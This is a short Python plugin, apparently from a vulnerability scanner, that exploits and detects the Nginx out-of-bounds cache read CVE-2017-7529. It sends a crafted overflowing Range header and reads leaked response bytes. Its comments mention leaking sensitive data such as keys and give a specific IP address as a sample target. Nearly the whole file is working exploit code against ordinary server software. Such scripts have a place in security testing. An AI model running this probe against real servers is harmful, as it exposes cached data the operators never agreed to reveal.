#coding=utf-8
# Nginx信息泄露！python3 NginxCVE-2017-7529.py http://207.246.80.61:8000/proxy/demo.png
# 敏感信息有KEY等等
import requests
from termcolor import cprint

class NginxCVE_2017_7529():
    def attack(self, url):
        #url = r'http://207.246.80.61:8000/'
        try:
            a = requests.get(url)
            start = int(a.headers['Content-Length']) + 300
            end = 0x8000000000000000 - start

            headers = {
                "Range": "bytes=-{},-{}".format(start, end)
            }
            res = requests.get(url=url, headers=headers, stream=True, timeout=10)
            ret = res.raw.read(500)
            code = res.status_code

            if code == 206:
                print( "[+]存在Nginx越界读取缓存漏洞（CVE-2017-7529）漏洞...(低危)")
            else:
                print("[-]不存在Nginx越界读取缓存漏洞（CVE-2017-7529）漏洞...(低危)")
        except Exception as e:
            cprint("[-] " + __file__ + "====>连接超时", "cyan")

def Nginx_special_plugin_(arg,config):
    NginxCVE_2017_7529().attack(arg.url)